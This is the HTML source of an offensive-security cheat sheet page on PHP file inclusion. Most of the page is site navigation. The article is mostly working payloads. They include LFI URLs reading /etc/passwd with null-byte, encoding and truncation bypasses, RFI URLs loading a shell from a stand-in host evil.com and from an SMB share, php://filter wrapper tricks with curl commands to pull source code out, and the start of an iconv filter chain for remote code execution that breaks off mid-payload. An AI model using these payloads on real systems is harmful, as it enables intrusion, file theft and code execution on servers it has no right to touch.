@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="All about file inclusion techniques, methods, payloads, how/why/when they work.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="File Inclusion" />
+<meta property="og:description" content="All about file inclusion techniques, methods, payloads, how/why/when they work." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/file_inclusion/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>File Inclusion | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.d50fea2a76ff11c274e36eee7c462453fa589bda1ed7236d45eaf1c9b25c1336.js" integrity="sha256-1Q/qKnb/EcJ0427ufEYkU/pYm9oe1yNtRerxybJcEzY=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="active">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>File Inclusion</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#file-inclusion">File Inclusion</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#basic-lfi">Basic LFI</a>
+          <ul>
+            <li><a href="#null-byte">Null byte</a></li>
+            <li><a href="#double-encoding">Double encoding</a></li>
+            <li><a href="#utf-8-encoding">UTF-8 encoding</a></li>
+            <li><a href="#path-and-dot-truncation">Path and dot truncation</a></li>
+            <li><a href="#filter-bypass-tricks">Filter bypass tricks</a></li>
+          </ul>
+        </li>
+        <li><a href="#basic-rfi">Basic RFI</a>
+          <ul>
+            <li><a href="#null-byte-1">Null byte</a></li>
+            <li><a href="#double-encoding-1">Double encoding</a></li>
+            <li><a href="#bypass-allow_url_include">Bypass allow_url_include</a></li>
+          </ul>
+        </li>
+        <li><a href="#lfi--rfi-using-wrappers">LFI / RFI using wrappers</a>
+          <ul>
+            <li><a href="#wrapper-phpfilter">Wrapper php://filter</a></li>
+            <li><a href="#wrapper-zip">Wrapper zip://</a></li>
+            <li><a href="#wrapper-data">Wrapper data://</a></li>
+            <li><a href="#wrapper-expect">Wrapper expect://</a></li>
+            <li><a href="#wrapper-input">Wrapper input://</a></li>
+            <li><a href="#wrapper-phar">Wrapper phar://</a></li>
+          </ul>
+        </li>
+        <li><a href="#lfi-to-rce-via-procfd">LFI to RCE via /proc/*/fd</a></li>
+        <li><a href="#lfi-to-rce-via-procselfenviron">LFI to RCE via /proc/self/environ</a></li>
+        <li><a href="#lfi-to-rce-via-upload">LFI to RCE via upload</a></li>
+        <li><a href="#lfi-to-rce-via-upload-race">LFI to RCE via upload (race)</a></li>
+        <li><a href="#lfi-to-rce-via-upload-findfirstfile">LFI to RCE via upload (FindFirstFile)</a></li>
+        <li><a href="#lfi-to-rce-via-phpinfo">LFI to RCE via phpinfo()</a></li>
+        <li><a href="#lfi-to-rce-via-controlled-log-file">LFI to RCE via controlled log file</a>
+          <ul>
+            <li><a href="#rce-via-ssh">RCE via SSH</a></li>
+            <li><a href="#rce-via-mail">RCE via Mail</a></li>
+            <li><a href="#rce-via-apache-logs">RCE via Apache logs</a></li>
+          </ul>
+        </li>
+        <li><a href="#lfi-to-rce-via-php-sessions">LFI to RCE via PHP sessions</a></li>
+        <li><a href="#lfi-to-rce-via-credentials-files">LFI to RCE via credentials files</a>
+          <ul>
+            <li><a href="#windows-version">Windows version</a></li>
+            <li><a href="#linux-version">Linux version</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="file-inclusion">
+  File Inclusion
+  <a class="anchor" href="#file-inclusion">#</a>
+</h1>
+<blockquote>
+<p>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &ldquo;dynamic file inclusion&rdquo; mechanisms implemented in the target application.</p>
+</blockquote>
+<blockquote>
+<p>The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a &ldquo;reading&rdquo; mechanism implemented in the target application</p>
+</blockquote>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/P0cL4bs/Kadimus">Kadimus - https://github.com/P0cL4bs/Kadimus</a></li>
+<li>
+  <a href="https://github.com/D35m0nd142/LFISuite">LFISuite - https://github.com/D35m0nd142/LFISuite</a></li>
+<li>
+  <a href="https://github.com/kurobeats/fimap">fimap - https://github.com/kurobeats/fimap</a></li>
+<li>
+  <a href="https://github.com/lightos/Panoptic">panoptic - https://github.com/lightos/Panoptic</a></li>
+</ul>
+<h2 id="basic-lfi">
+  Basic LFI
+  <a class="anchor" href="#basic-lfi">#</a>
+</h2>
+<p>In the following examples we include the <code>/etc/passwd</code> file, check the <code>Directory &amp; Path Traversal</code> chapter for more interesting files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../etc/passwd
+</span></span></code></pre></div><h3 id="null-byte">
+  Null byte
+  <a class="anchor" href="#null-byte">#</a>
+</h3>
+<p>:warning: In versions of PHP below 5.3.4 we can terminate with null byte.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../etc/passwd<span style="color:#66d9ef">%</span><span style="color:#ae81ff">00</span>
+</span></span></code></pre></div><h3 id="double-encoding">
+  Double encoding
+  <a class="anchor" href="#double-encoding">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=<span style="color:#66d9ef">%</span>252e<span style="color:#66d9ef">%</span>252e<span style="color:#66d9ef">%</span>252fetc<span style="color:#66d9ef">%</span>252fpasswd
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=<span style="color:#66d9ef">%</span>252e<span style="color:#66d9ef">%</span>252e<span style="color:#66d9ef">%</span>252fetc<span style="color:#66d9ef">%</span>252fpasswd<span style="color:#66d9ef">%</span><span style="color:#ae81ff">00</span>
+</span></span></code></pre></div><h3 id="utf-8-encoding">
+  UTF-8 encoding
+  <a class="anchor" href="#utf-8-encoding">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae/<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae/<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae/etc/passwd
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae/<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae/<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae<span style="color:#66d9ef">%</span>c0<span style="color:#66d9ef">%</span>ae/etc/passwd<span style="color:#66d9ef">%</span><span style="color:#ae81ff">00</span>
+</span></span></code></pre></div><h3 id="path-and-dot-truncation">
+  Path and dot truncation
+  <a class="anchor" href="#path-and-dot-truncation">#</a>
+</h3>
+<p>On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../etc/passwd............[<span style="color:#66d9ef">ADD MORE</span>]
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../etc/passwd\.\.\.\.\.\.[<span style="color:#66d9ef">ADD MORE</span>]
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../etc/passwd/./././././.[<span style="color:#66d9ef">ADD MORE</span>] 
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=../../../[<span style="color:#66d9ef">ADD MORE</span>]../../../../etc/passwd
+</span></span></code></pre></div><h3 id="filter-bypass-tricks">
+  Filter bypass tricks
+  <a class="anchor" href="#filter-bypass-tricks">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=....//....//etc/passwd
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=..///////..////..//////etc/passwd
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=/<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../<span style="color:#66d9ef">%</span>5C../etc/passwd
+</span></span></code></pre></div><h2 id="basic-rfi">
+  Basic RFI
+  <a class="anchor" href="#basic-rfi">#</a>
+</h2>
+<p>Most of the filter bypasses from LFI section can be reused for RFI.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=http<span style="color:#960050;background-color:#1e0010">:</span>//evil.com/shell.txt
+</span></span></code></pre></div><h3 id="null-byte-1">
+  Null byte
+  <a class="anchor" href="#null-byte-1">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=http<span style="color:#960050;background-color:#1e0010">:</span>//evil.com/shell.txt<span style="color:#66d9ef">%</span><span style="color:#ae81ff">00</span>
+</span></span></code></pre></div><h3 id="double-encoding-1">
+  Double encoding
+  <a class="anchor" href="#double-encoding-1">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=http<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#66d9ef">%</span><span style="color:#ae81ff">252f</span><span style="color:#66d9ef">%</span>252fevil.com<span style="color:#66d9ef">%</span>252fshell.txt
+</span></span></code></pre></div><h3 id="bypass-allow_url_include">
+  Bypass allow_url_include
+  <a class="anchor" href="#bypass-allow_url_include">#</a>
+</h3>
+<p>When <code>allow_url_include</code> and <code>allow_url_fopen</code> are set to <code>Off</code>. It is still possible to include a remote file on Windows box using the <code>smb</code> protocol.</p>
+<ol>
+<li>Create a share open to everyone</li>
+<li>Write a PHP code inside a file : <code>shell.php</code></li>
+<li>Include it <code>http://example.com/index.php?page=\\10.0.0.1\share\shell.php</code></li>
+</ol>
+<h2 id="lfi--rfi-using-wrappers">
+  LFI / RFI using wrappers
+  <a class="anchor" href="#lfi--rfi-using-wrappers">#</a>
+</h2>
+<h3 id="wrapper-phpfilter">
+  Wrapper php://filter
+  <a class="anchor" href="#wrapper-phpfilter">#</a>
+</h3>
+<p>The part &ldquo;php://filter&rdquo; is case insensitive</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=php<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#66d9ef">filter</span>/read=string.rot13/resource=index.php
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=php<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#66d9ef">filter</span>/convert.iconv.utf-<span style="color:#ae81ff">8</span>.utf-<span style="color:#ae81ff">16</span>/resource=index.php
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=php<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#66d9ef">filter</span>/convert.base64-encode/resource=index.php
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=pHp<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#66d9ef">FilTer</span>/convert.base64-encode/resource=index.php
+</span></span></code></pre></div><p>Wrappers can be chained with a compression wrapper for large files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/index.php<span style="color:#66d9ef">?</span>page=php<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#66d9ef">filter</span>/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+</span></span></code></pre></div><p>NOTE: Wrappers can be chained multiple times using <code>|</code> or <code>/</code>:</p>
+<ul>
+<li>Multiple base64 decodes: <code>php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s</code></li>
+<li>deflate then base64encode (useful for limited character exfil): <code>php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./kadimus -u <span style="color:#e6db74">&#34;http://example.com/index.php?page=vuln&#34;</span> -S <span style="color:#f92672">-f</span> <span style="color:#e6db74">&#34;index.php%00&#34;</span> -O index.php --parameter page 
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php&#34;</span> | base64 -d &gt; index.php
+</span></span></code></pre></div><p>Also there is a way to turn the <code>php://filter</code> into a full RCE. Use 
+  <a href="./LFI2RCE.py">LFI2RCE.py</a> to generate a custom payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># vulnerable file: index.php</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># vulnerable parameter: file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># executed command: id</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># executed PHP code: &lt;?=`$_GET[0]`;;?&gt;</span>
+</span></span><span style="display:flex;"><span>curl <span style="color:#e6db74">&#34;127.0.0.1:8000/index.php?0=id&amp;file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.b